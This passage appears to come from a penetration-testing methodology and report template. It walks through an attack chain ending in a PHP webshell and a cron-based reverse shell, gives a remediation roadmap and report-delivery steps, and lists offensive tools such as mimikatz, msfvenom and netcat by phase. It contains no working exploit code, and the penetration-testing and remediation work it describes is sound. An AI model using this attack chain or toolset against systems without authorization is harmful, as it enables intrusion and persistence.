  * **STEP 3 — PRIVILEGE ESCALATION (15 minutes):** Admin panel accessed. Unrestricted file upload exploited; PHP webshell uploaded[cite: 19].
  * **STEP 4 — SYSTEM COMPROMISE (10 minutes):** Webshell provides OS command execution. Server running as root; full system access achieved[cite: 19].
  * **STEP 5 — PERSISTENCE (5 minutes):** Cron-based reverse shell planted. Access maintained after password change[cite: 19].
* **TOTAL TIME TO FULL COMPROMISE:** 3 hours[cite: 19]
* **SKILL LEVEL REQUIRED:** Intermediate[cite: 19]

### Remediation Roadmap Template

| Priority | Timeline | Focus Area | Actions |
| :--- | :--- | :--- | :--- |
| **IMMEDIATE**[cite: 19] | 0–48 hrs[cite: 19] | Critical findings only[cite: 19] | Parameterize SQL queries, restrict file uploads, run web server as non-root, rotate all credentials[cite: 19] |
| **SHORT TERM**[cite: 19] | 1–2 weeks[cite: 19] | High severity[cite: 19] | Implement MFA, fix IDOR with server-side auth, output encoding for XSS, developer security training[cite: 19] |
| **MEDIUM TERM**[cite: 19] | 2–4 weeks[cite: 20] | Medium severity[cite: 20] | Upgrade TLS to 1.3, implement security headers, disable directory listing, deploy IDS/WAF[cite: 20] |
| **LONG TERM**[cite: 20] | 30–90 days[cite: 20] | Low + systemic[cite: 20] | Remove version disclosure, establish vulnerability management program, quarterly pentest schedule[cite: 20] |

### Report Delivery Protocol
* Deliver primary report as password-protected PDF[cite: 20]
* Provide editable DOCX version for client's records[cite: 20]
* Deliver separate 2-page executive summary[cite: 20]
* Send report and password via separate channels — never together[cite: 20]
* Schedule debrief call to walk through findings with client team[cite: 20]
* Agree on remediation timeline in writing[cite: 20]
* Schedule retest date for all patched critical and high findings[cite: 20]
* Issue remediation confirmation report after successful retest[cite: 20]
* Formally close engagement with signed-off completion document[cite: 20]

---

## APPENDICES

### Quick Reference Command Sheet
#### Evidence Folder Structure
```bash
mkdir -p /engagement/{01_recon,02_scanning,03_vuln_analysis,04_exploitation,05_persistence,06_report,evidence/{screenshots,burp_exports,tool_outputs},loot}

# Start session logging immediately
script -a /engagement/session_$(date +%Y%m%d_%H%M).log
```[cite: 21]

#### Complete Phase-by-Phase Quick Reference

| Phase | Core Tools & Commands |
| :--- | :--- |
| **PHASE 1 — RECON**[cite: 21] | `whois`, `dig`, `amass`, `subfinder`, `theHarvester`, `shodan`, `crt.sh`, `spiderfoot`, google dorks[cite: 21] |
| **PHASE 2 — SCANNING**[cite: 21] | `rustscan`, `nmap`, `nikto`, `gobuster`, `ffuf`, `httpx`, `gau`, `katana`, `wafw00f`, `nuclei`, `wpscan`[cite: 21] |
| **PHASE 3 — VULN ANALYSIS**[cite: 21] | Burp Suite, OWASP ZAP, `sqlmap`, `xsstrike`, `hydra`, nuclei cves, `testssl.sh`, `commix`[cite: 21] |
| **PHASE 4 — EXPLOITATION**[cite: 21] | Metasploit, Burp Pro, `sqlmap`, `commix`, `msfvenom`, `netcat`, BEEF framework[cite: 21] |
| **PHASE 5 — PERSISTENCE**[cite: 21] | `winpeas`, `linpeas`, `mimikatz`, `chisel`, `proxychains`, `john`, `crackmapexec`[cite: 21] |
| **PHASE 6 — REPORTING**[cite: 21] | CVSS calculator, CherryTree, Obsidian, Burp logger, `pwncat`, QuantumForge report template[cite: 21] |

---

> *The mark of a truly elite red teamer is not how deep they can break in.*  
> *It is how clearly they can explain the risk,*  
> *how professionally they document the path,*  
> *and how thoroughly they help the client build back stronger.*  
> 
> **QUANTUMFORGE SECURITY OPERATIONS**  
> **Fast. Smart. Limitless.**  
> **Adeyinka Samuel (Big Sam) | Lead Red Team Operator**  
> `security@quantumforge.com`[cite: 22]

```
